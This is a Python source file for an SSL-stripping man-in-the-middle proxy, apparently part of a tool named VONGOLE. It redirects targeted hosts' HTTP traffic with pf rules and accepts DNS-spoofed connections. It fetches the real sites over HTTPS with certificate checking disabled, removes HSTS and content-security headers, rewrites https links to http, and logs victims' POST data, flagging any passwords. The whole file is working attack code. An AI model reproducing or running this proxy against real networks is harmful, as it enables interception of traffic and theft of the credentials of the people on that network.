import logging
import socket
import select
import threading
import re
import time
import subprocess
import os
import ssl
from urllib.parse import urlparse
from scapy.layers.inet import TCP, IP

logger = logging.getLogger('SSLStripper')

try:
    from colorama import Fore, Style
except ImportError:
    class Fore:
        RED = YELLOW = GREEN = CYAN = BLUE = MAGENTA = ''

    class Style:
        RESET_ALL = ''


class SSLStripper:
    """
    SSL Stripper
    """

    def __init__(self, interface, packet_handler=None, target_ips=None, verbose=False):
        self.interface = interface
        self.packet_handler = packet_handler
        self.target_ips = target_ips
        self.running = False
        self.proxy_port = 10000
        # Also listen on port 80 for DNS-spoofed connections.
        self.http_port = 80
        self.server_socket = None
        self.http_socket = None  # Direct HTTP listener
        self.proxy_thread = None
        self.http_thread = None
        self.stripped_count = 0

        self.verbose = verbose

        # Track active HTTPS connections per domain
        self.https_domains = set()

        # SSL context for server connections
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

        # PF config
        self.pf_conf_file = "/tmp/sslstrip_final.conf"
        self.local_ip = None
        self.local_ipv6 = None

        logger.info("SSL Stripper initialized")

    def _get_interface_ipv6(self):
        try:
            import socket
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                if name == self.interface:
                    for a in addrs:
                        if a.family == socket.AF_INET6:
                            if not a.address.startswith('fe80'):
                                return a.address
                    # Return link-local if thats all we have
                    for a in addrs:
                        if a.family == socket.AF_INET6:
                            return a.address
        except:
            pass
        return None

    def start(self):
        """Start SSL stripping proxy"""
        self.running = True

        # Get interface IP
        self.local_ip = self._get_interface_ip()
        if not self.local_ip:
            logger.error("Could not determine interface IP")
            return False

        self.local_ipv6 = self._get_interface_ipv6()
        if self.local_ipv6 and self.verbose:
            logger.info(f"IPv6 address: {self.local_ipv6}")

        # Setup traffic redirection (only for intercepted traffic, not DNS-spoofed)
        if not self._setup_traffic_redirection():
            logger.error("Failed to setup traffic redirection")
            return False

        # Configure packet handler
        if self.packet_handler:
            self.packet_handler.local_proxy_ip = self.local_ip
            self.packet_handler.mode = "sslstrip"
            logger.info("[VONGOLE] Packet handler set to SSL strip mode")

        # Start proxy server (for redirected traffic)
        try:
            self.server_socket = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(("0.0.0.0", self.proxy_port))
            self.server_socket.listen(50)
            self.server_socket.settimeout(1.0)

            logger.info(
                f"[VONGOLE] SSL Strip proxy listening on 0.0.0.0:{self.proxy_port}")

            # Also listen on port 80 for DNS-spoofed connections
            self.http_socket = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)
            self.http_socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.http_socket.bind(("0.0.0.0", self.http_port))
            self.http_socket.listen(50)
            self.http_socket.settimeout(1.0)

            logger.info(
                f"[VONGOLE] HTTP server listening on 0.0.0.0:{self.http_port} for DNS-spoofed connections")

            # Start proxy threads
            self.proxy_thread = threading.Thread(
                target=self._proxy_loop,
                args=(self.server_socket, "proxy"),
                name="SSLStripProxy",
                daemon=True
            )
            self.proxy_thread.start()

            self.http_thread = threading.Thread(
                target=self._proxy_loop,
                args=(self.http_socket, "http"),
                name="SSLStripHTTP",
                daemon=True
            )

            self.http_thread.start()

            if self.verbose:
                print(f"\nSSL Stripper Active!")
                print(f"Proxy on port {self.proxy_port} (redirected traffic)")
                print(f"HTTP on port {self.http_port} (DNS-spoofed traffic)")
                print(f"Victim connects via HTTP -> We connect via HTTPS\n")

            return True

        except Exception as e:
            logger.exception(f"Failed to start proxy: {e}")
            return False

    # Rip dry
    def _get_interface_ip(self):
        """Get IP address of our interface"""
        try:
            result = subprocess.run(
                f"ifconfig {self.interface} | grep 'inet ' | awk '{{print $2}}'",
                shell=True, capture_output=True, text=True
            )
            ip = result.stdout.strip()
            return ip if ip else None
        except Exception as e:
            logger.error(f"Could not get interface IP: {e}")
            return None

    def _setup_traffic_redirection(self):
        """Setup PF rules for traffic redirection - UPDATED FOR MULTIPLE TARGETS"""
        try:
            # Build redirect rules for EACH target
            redirect_rules = []

            for target_ip in self.target_ips:
                # Add IPv4 rules for this target
                redirect_rules.append(f"# Rules for target {target_ip}")
                redirect_rules.append(
                    f"rdr pass on {self.interface} inet proto tcp from {target_ip} to any port 80 -> {self.local_ip} port {self.proxy_port}"
                )
                redirect_rules.append(
                    f"rdr pass on {self.interface} inet proto tcp from {target_ip} to {self.local_ip} port 80 -> {self.local_ip} port {self.proxy_port}"
                )

            # Join all redirect rules
            redirect_section = '\n'.join(redirect_rules)

            # NOTE: DONT TOUCH THIS ITS LIKE HELLA DELICATE
            pf_rules = f"""
# Redirect HTTP traffic to our proxy (from intercepts)
{redirect_section}

# Allow proxy's outbound connections
pass out on {self.interface} inet proto tcp from {self.local_ip} to any port {{80, 443}} keep state
pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {self.proxy_port} keep state
"""

            # If we have IPv6, add IPv6 rules too
            if hasattr(self, 'local_ipv6') and self.local_ipv6:
                ipv6_redirect_rules = []

                for target_ip in self.target_ips:
                    # Only add IPv6 rules if target looks like IPv6
                    if ':' in target_ip:
                        ipv6_redirect_rules.append(
                            f"rdr pass on {self.interface} inet6 proto tcp from {target_ip} to any port 80 -> {self.local_ipv6} port {self.proxy_port}"
                        )
                        ipv6_redirect_rules.append(
                            f"rdr pass on {self.interface} inet6 proto tcp from {target_ip} to {self.local_ipv6} port 80 -> {self.local_ipv6} port {self.proxy_port}"
                        )

                # NOTE: ALSO ODNT TOUCH IT DONT LIKE TAB IT OR ANYTHING
                if ipv6_redirect_rules:
                    ipv6_section = '\n'.join(ipv6_redirect_rules)
                    pf_rules = f"""
# IPv4 Rules
{redirect_section}

# IPv6 Rules
{ipv6_section}

# Allow proxy's outbound connections (IPv4 and IPv6)
pass out on {self.interface} inet proto tcp from {self.local_ip} to any port {{80, 443}} keep state
pass out on {self.interface} inet6 proto tcp from {self.local_ipv6} to any port {{80, 443}} keep state
pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {self.proxy_port} keep state
pass in on {self.interface} inet6 proto tcp from any to {self.local_ipv6} port {self.proxy_port} keep state
"""

            with open(self.pf_conf_file, "w") as f:
                f.write(pf_rules)

            subprocess.run(
                ["sudo", "pfctl", "-f", self.pf_conf_file], check=True)
            subprocess.run(["sudo", "pfctl", "-e"], check=False)

            logger.info("[VONGOLE] PF rules loaded")
            if self.verbose:
                logger.debug(
                    f"Loaded PF rules for {len(self.target_ips)} targets")

            return True

        except Exception as e:
            logger.exception(f"Failed to setup redirection: {e}")
            return False

    def stop(self):
        """Stop SSL stripping and cleanup"""
        self.running = False

        if self.packet_handler:
            self.packet_handler.mode = "normal"

        # Close sockets
        for sock in [self.server_socket, self.http_socket]:
            if sock:
                try:
                    sock.close()
                except:
                    pass

        # Wait for threads
        for thread in [self.proxy_thread, self.http_thread]:
            if thread:
                thread.join(timeout=2)

        # Cleanup PF
        subprocess.run(["sudo", "pfctl", "-F", "all"], check=False)
        subprocess.run(["sudo", "pfctl", "-f", "/etc/pf.conf"], check=False)
        subprocess.run(["sudo", "pfctl", "-d"], check=False)

        if os.path.exists(self.pf_conf_file):
            os.remove(self.pf_conf_file)

        logger.info(
            f"SSL Stripper stopped - stripped {self.stripped_count} connections")

    def _proxy_loop(self, server_sock, socket_type):
        """Accept incoming connections"""
        while self.running:
            try:
                client_sock, addr = server_sock.accept()

                # Log connection type cause why not
                if socket_type == "http":
                    logger.info(f"DNS-spoofed connection from {addr}")
                else:
                    logger.info(f"Redirected connection from {addr}")

                # Handle connection in thread
                threading.Thread(
                    target=self._handle_client,
                    args=(client_sock, addr),
                    daemon=True
                ).start()

            except socket.timeout:
                continue
            except OSError:
                break

    def _read_complete_response(self, sock):
        """Read a complete HTTP response with chunk support"""
        response = b''

        # Read headers
        while b'\r\n\r\n' not in response:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

        if b'\r\n\r\n' not in response:
            return response

        header_end = response.find(b'\r\n\r\n')
        headers = response[:header_end]
        body = response[header_end + 4:]

        # Determine how we gotta read body; thats what she said?
        is_chunked = b'transfer-encoding: chunked' in headers.lower()

        content_length = None
        for line in headers.split(b'\r\n'):
            if line.lower().startswith(b'content-length:'):
                content_length = int(line.split(b':')[1].strip())
                break

        if is_chunked:
            sock.settimeout(5.0)
            while True:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    body += chunk

                    # Check for end of chunks
                    if b'\r\n0\r\n\r\n' in body:
                        break
                except socket.timeout:
                    break

        elif content_length is not None:
            while len(body) < content_length:
                chunk = sock.recv(min(8192, content_length - len(body)))
                if not chunk:
                    break
                body += chunk
        else:
            # Read until connection closes
            sock.settimeout(2.0)
            while True:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    body += chunk
                except socket.timeout:
                    break

        return headers + b'\r\n\r\n' + body

    def _is_https_redirect(self, response):
        """Check if response is redirecting to HTTPS"""
        if not response:
            return False

        lines = response.split(b'\r\n')
        if not lines:
            return False

        # Check status code
        status_line = lines[0]
        if b'301' in status_line or b'302' in status_line or b'303' in status_line or b'307' in status_line:

            for line in lines:
                if line.lower().startswith(b'location:') and b'https://' in line:
                    return True

        return False

    def _process_https_response(self, response):
        """Process HTTPS response so like strip security headers and convert to plain HTTP"""
        if not response or b'\r\n\r\n' not in response:
            return response

        header_end = response.find(b'\r\n\r\n')
        headers = response[:header_end]
        body = response[header_end + 4:]

        # Process headers
        new_headers = []
        is_chunked = False

        for line in headers.split(b'\r\n'):
            line_lower = line.lower()

            # Skip security headers
            if any(h in line_lower for h in [
                b'strict-transport-security',
                b'content-security-policy',
                b'upgrade:',
                b'alt-svc:'
            ]):
                continue

            # Check for chunked
            if b'transfer-encoding: chunked' in line_lower:
                is_chunked = True
                continue

            # Skip existing content-length cause we'll recacl
            if b'content-length:' in line_lower:
                continue

            new_headers.append(line)

        # Dechunk if needed
        if is_chunked:
            body = self._dechunk(body)

        # Lol
        body = body.replace(b'https://', b'http://')

        # Add Content-Length
        new_headers.append(f'Content-Length: {len(body)}'.encode())

        # Add connection close to avoid keep-alive issues TODO kinda nvm idk
        new_headers.append(b'Connection: close')

        return b'\r\n'.join(new_headers) + b'\r\n\r\n' + body

    def _dechunk(self, data):
        """Dechunk"""
        result = b''
        pos = 0

        while pos < len(data):
            # Find chunk size line end
            eol = data.find(b'\r\n', pos)
            if eol == -1:
                break

            # Extract chunk size
            size_line = data[pos:eol]
            if not size_line:
                break

            # Parse size (handle chunk extensions)
            try:
                chunk_size = int(size_line.split(b';')[0].strip(), 16)
            except ValueError:
                break

            pos = eol + 2  # Skip CRLF

            # End of chunks?
            if chunk_size == 0:
                break

            # Check if we have enough data
            if pos + chunk_size > len(data):
                break

            # Extract chunk
            result += data[pos:pos + chunk_size]
            pos += chunk_size

            # Skip trailing CRLF
            if pos + 2 <= len(data) and data[pos:pos + 2] == b'\r\n':
                pos += 2

        return result

    def _handle_client(self, client_sock, client_addr):
        """CORE stuff, we accept the http request from victim, upgrade when needed, strip, and send back as if its http"""
        server_sock = None

        try:
            #  Read the complete request, cause like posts and sh we gotta read furhter etc
            client_sock.settimeout(10.0)
            request = b''

            while True:
                chunk = client_sock.recv(4096)
                if not chunk:                     # client closed
                    return
                request += chunk

                # We have at least the headers>?
                if b'\r\n\r\n' in request:
                    headers_end = request.find(b'\r\n\r\n')
                    headers = request[:headers_end]

                    # Look for Content-Length (body size)
                    content_length = 0
                    for line in headers.split(b'\r\n'):
                        if line.lower().startswith(b'content-length:'):
                            content_length = int(line.split(b':')[1].strip())
                            break

                    # If body present, keep reading until we have it all
                    if content_length:
                        body_so_far = len(request) - headers_end - 4
                        while body_so_far < content_length:
                            chunk = client_sock.recv(min(4096,
                                                         content_length-body_so_far))
                            if not chunk:
                                break
                            request += chunk
                            body_so_far = len(request) - headers_end - 4
                    break  # full request captured, coolsies

            # Extract Host header so we can open the conn to the actual server ourselves
            host = None
            for line in request.split(b'\r\n'):
                if line.lower().startswith(b'host:'):
                    host = line[5:].strip().decode()
                    break

            if not host:
                logger.error("No Host header in request :(")
                return

            # Log POST data if exists TODO like actually maek this proper and maybe look at other stuff but anyways i tested w httbin post maybe we cna use this in the video idk idkidkeadjoieskl rnwo im literally just scanning for password= not robust etc
            if request.startswith(b'POST ') and self.verbose:
                body_start = request.find(b'\r\n\r\n') + 4
                post_data = request[body_start:]

                if post_data:
                    logger.info(
                        f"CAPTURED POST DATA ({client_addr[0]} -> {host})")
                    logger.info(
                        f"{post_data.decode('utf-8', errors='ignore')}")

                    lower = post_data.lower()
                    if b'password' in lower or b'pass=' in lower:
                        logger.warning("PASSWORD DETECTED!")

            if self.verbose:
                logger.info(f"[VONGOLE] Request for {host}")

            # Decide protocol (HTTP first unless domain known for HTTPS) Tehcnically we are using this because we know its https but whatever i think its a bit more robust htis way
            use_https = (
                host in self.https_domains or
                any(host.endswith(d) for d in ('github.com', 'google.com'))
            )

            # HTTP path first
            if not use_https:
                try:
                    server_sock = socket.socket(
                        socket.AF_INET, socket.SOCK_STREAM)
                    server_sock.settimeout(10.0)
                    server_sock.connect((host, 80))
                    server_sock.sendall(request)

                    # Full response (handles chunked n content-length)
                    response = self._read_complete_response(server_sock)

                    # HTTPS redirect?
                    if self._is_https_redirect(response):
                        if self.verbose:
                            logger.info(f"[VONGOLE] SSL STRIPPING: {host}")

                        self.stripped_count += 1
                        self.https_domains.add(host)

                        server_sock.close()              # close HTTP
                        server_sock = self._connect_https(host)
                        server_sock.sendall(request)
                        response = self._read_complete_response(server_sock)
                        response = self._process_https_response(response)

                    # relay back to victim
                    client_sock.sendall(response)

                except Exception as e:
                    logger.error(f"HTTP path failed: {e}")
                    # Fallback straight to HTTPS
                    try:
                        if server_sock:
                            server_sock.close()
                        server_sock = self._connect_https(host)
                        server_sock.sendall(request)
                        response = self._read_complete_response(server_sock)
                        response = self._process_https_response(response)
                        client_sock.sendall(response)
                        self.https_domains.add(host)
                    except Exception as e2:
                        logger.error(f"HTTPS fallback failed: {e2}")

            # HTTPS path for known HTTPS domains
            else:
                server_sock = self._connect_https(host)
                server_sock.sendall(request)
                response = self._read_complete_response(server_sock)
                response = self._process_https_response(response)
                client_sock.sendall(response)

        except Exception as e:
            logger.error(f"Client handling error: {e}")

        finally:
            # Cleanup
            try:
                client_sock.close()
            except Exception:
                pass
            if server_sock:
                try:
                    server_sock.close()
                except Exception:
                    pass

    def _connect_https(self, host):
        """Create HTTPS conn"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10.0)
        sock.connect((host, 443))

        # Wrap with SSL
        ssl_sock = self.ssl_context.wrap_socket(sock, server_hostname=host)
        return ssl_sock
